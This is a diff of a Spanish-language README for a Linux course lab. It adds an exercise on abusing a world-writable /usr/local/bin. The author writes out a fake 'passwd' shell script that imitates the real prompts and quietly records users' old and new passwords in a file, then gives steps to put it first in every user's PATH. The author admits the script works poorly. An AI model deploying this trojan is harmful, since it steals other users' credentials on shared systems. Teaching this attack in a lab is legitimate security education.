@@ -613,7 +613,7 @@ Y ahora escribiriamos los pasos realizados en el readme:
 ```
 
 
-## Ejercicio 3 TEMAS: arranque, particiones
+## Ejercicio 3 TEMAS: arranque, particiones, RAIDS
  Arranca la máquina desde el snapshot Ej3Begin. Estás trabajando con un sistema Debian que dispone de un disco adicional en el que se ha creado una partición e instalado el sistema de ficheros raíz de una distribución alternativa de Linux (Lubuntu). Para gestionar el uso de ambos sistemas, lleva a cabo las siguientes tareas: 
 1. Crea una nueva entrada en el BootLoader del sistema Debian que te permita arrancar la distribución Lubuntu. Limita el contenido de dicha entrada a los elementos estrictamente necesarios (kernel, ramdisk y sistema de ficheros raíz). La nueva entrada será la que arranque por defecto de forma permanente. 
 2. Hemos extraviado el password de root del sistema Lubuntu. Lleva a cabo las tareas necesarias para que dicho password sea el mismo que el de la distribución ebian. 
@@ -1305,4 +1305,124 @@ Finalmente, comprueba de nuevo el estado del servicio ssh para asegurarte de que
 systemctl status ssh.service
 ```
 Si el servicio está activo y no hay errores en los logs, entonces has solucionado el problema con éxito.
+
+## Ejercicio 4
+
+Arranca la máquina desde el snapshot Ej4Begin. El administrador ha cometido una imprudencia, consistente en conceder permisos de escritura sobre el directorio /usr/local/bin. Dicho directorio es uno de los que se incluyen en la variable $PATH de los nuevos usuarios, lo que les permite crear falsos comandos para obtener información privilegiada. Tu objetivo es, como usuario test (temporal), crear un script de nombre passwd, que emule el comportamiento del comando de mismo nombre, y te sirva para apropiarte de las claves del resto de usuarios. Ten en cuenta los siguientes aspectos: 
+
+1. Revisa el funcionamiento y el tipo de mensajes que imprime por pantalla el comando passwd (para imitarlos). Ten en cuenta que un usuario solo es capaz de cambiar su propia contraseña, y no la de otros usuarios. Ten también en cuenta que la nueva contraseña se solicita dos veces, y si ambos strings no coinciden se produce un mensaje de error. 
+2. Guarda el usuario/contraseña capturados en tu $HOME, en un fichero oculto (.datos.txt). 
+3. El cambio de contraseña SI debe producirse, por lo que debes reescribir la entrada del shadow para el usuario que cambia la contraseña (introducir la nueva contraseña). Busca online la forma de ejecutar el comando passwd desde un script para poder hacer este cambio. 
+4. Haz que éste sea el comando que se ejecuta por defecto en el sistema y comprueba con el usuario test2 (temporal2) su funcionamiento. 
+
+Debemos contemplar varios casos:
+1. Pide cambiar la contraseña de otro:
+```
+test@LAPTOP-OR195PNE:~$ passwd ramon
+passwd: no debe ver o cambiar la información de la contraseña para ramon.
+```
+
+2. La contraseña se pide dos veces y debe coincidir (caso bueno)
+```sh
+test@LAPTOP-OR195PNE:~$ passwd test
+Cambiando la contraseña de test.
+Contraseña actual:
+Nueva contraseña:
+Vuelva a escribir la nueva contraseña:
+passwd: contraseña actualizada correctamente
+```
+Caso malo:
+```sh
+test@LAPTOP-OR195PNE:~$ passwd test
+Cambiando la contraseña de test.
+Contraseña actual:
+Nueva contraseña:
+Vuelva a escribir la nueva contraseña:
+Las contraseñas no coinciden.
+passwd: Error de manipulación del testigo de autenticación
+passwd: no se ha cambiado la contraseña
+```
+
+Escribimos e script:
+```sh
+#!/bin/bash
+
+#primer mensaje
+echo -n "Cambiando la contraseña de "; whoami
+
+echo -n "Contraseña actual: "
+read -s pass1
+printf '\n'
+
+# Verificar la contraseña actual
+echo "$pass1" | su -s /bin/bash -c "exit" `whoami` >/dev/null 2>&1
+if [ $? -ne 0 ]; then
+    echo "La contraseña actual es incorrecta."
+    exit 1
+fi
+
+echo -n "Nueva contraseña: "
+read -s pass2
+printf '\n'
+
+echo -n "Vuelva a escribir la nueva contraseña: "
+read -s pass3
+printf '\n'
+
+if [ $pass2 = $pass3 ]; then
+    echo -e "`whoami`:$pass3" | chpasswd > error.txt
+    echo "passwd: contraseña actualizada correctamente"
+
+    echo -n "Usuario: " >> datos.txt
+    whoami >> datos.txt
+    echo -n "Contraseña actual: " >> datos.txt
+    echo $pass2 >> datos.txt
+    echo -n "Contraseña anterior: " >> datos.txt
+    echo $pass1 >> datos.txt
+    exit 0
+else
+    echo "Las contraseñas no coinciden."
+    echo "passwd: Error de manipulación del testigo de autenticación"
+    echo "passwd: no se ha cambiado la contraseña"
+
+    echo -n "Usuario: " >> datos.txt
+    whoami >> datos.txt
+    echo -n "Contraseña actual: " >> datos.txt
+    echo $pass1 >> datos.txt
+fi
+```
+
+No va bien el script pero es lo mejor que pude conseguir
+Deberemos cambiar la variable path de los usuarios para que ejecute este comando en vez de passwd original.
+
+Para cambiar la variable PATH para todos los usuarios en un sistema Linux, puedes agregar o modificar las declaraciones de exportación en un archivo de script de shell en el directorio `/etc/profile.d/`.
+
+Aquí hay un ejemplo de cómo puedes hacerlo:
+
+1. Abre un nuevo archivo en el directorio `/etc/profile.d/` con privilegios de superusuario. Puedes llamar a este archivo `custom_path.sh`:
+
+```bash
+sudo nano /etc/profile.d/custom_path.sh
+```
+
+2. En este archivo, agrega la siguiente línea para agregar tu directorio personalizado al principio de la variable PATH:
+
+```bash
+export PATH=/ruta/a/tu/directorio:$PATH
+```
+
+Reemplaza `/ruta/a/tu/directorio` con la ruta al directorio que quieres agregar a la variable PATH.
+
+3. Guarda y cierra el archivo.
+
+4. Haz que el script sea ejecutable con el siguiente comando:
+
+```bash
+sudo chmod +x /etc/profile.d/custom_path.sh
+```
+
+Después de hacer esto, la ruta que agregaste será parte de la variable PATH para todos los usuarios. Sin embargo, los cambios no tendrán efecto hasta que los usuarios cierren y vuelvan a abrir su sesión, o hasta que ejecuten el comando `source /etc/profile.d/custom_path.sh`.
+
+Ten en cuenta que este método cambiará la variable PATH para todos los usuarios, incluido el superusuario. Si solo quieres cambiar la variable PATH para usuarios normales, puedes considerar agregar la declaración de exportación a `~/.bashrc` o `~/.bash_profile` en lugar de `/etc/profile.d/`.
+
 
